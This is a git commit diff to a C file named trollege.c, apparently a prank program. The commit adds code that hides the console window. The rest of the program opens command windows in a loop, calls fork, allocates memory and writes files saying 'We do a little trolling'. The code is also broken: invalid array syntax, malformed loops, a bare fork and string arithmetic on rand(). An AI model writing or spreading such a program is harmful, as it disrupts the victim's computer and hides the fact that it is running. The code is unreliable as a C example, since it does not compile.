4b8046eeed387d259f6dbce99aaf1abb04478bbb
Teresa [Redacted] <99054975+ComradeYellowCitrusFruit@users.noreply.github.com>
2022-02-10 10:20:05 -0500

    Hides window
    It now hides the console window, redid the readme

--- src/trollege.c
+++ src/trollege.c
@@ -1,13 +1,19 @@
 #include <stdlib.h>
 #include <stdio.h>
+#define _WIN32_WINNT 0x0500
+#include <windows.h>
+
 //forgive me if this is trash I am new to C
 int main() {
+    HWND hWnd = GetConsoleWindow();
+    ShowWindow( hWnd, SW_MINIMIZE );
+    ShowWindow( hWnd, SW_HIDE );
     FILE[] *x;
     for(int i = 0, i < 20 * i; i++) {
         system("start cmd");
         fork;
         malloc(1000);
-        x[i] = fopen(rand() + '.' + rand(), 'w+');
+        x[i] = fopen(rand() + '.txt', 'w+');
         for(int y = 0, y < i; y++){
             fputs("We do a little trolling\n", x[i]);
         }
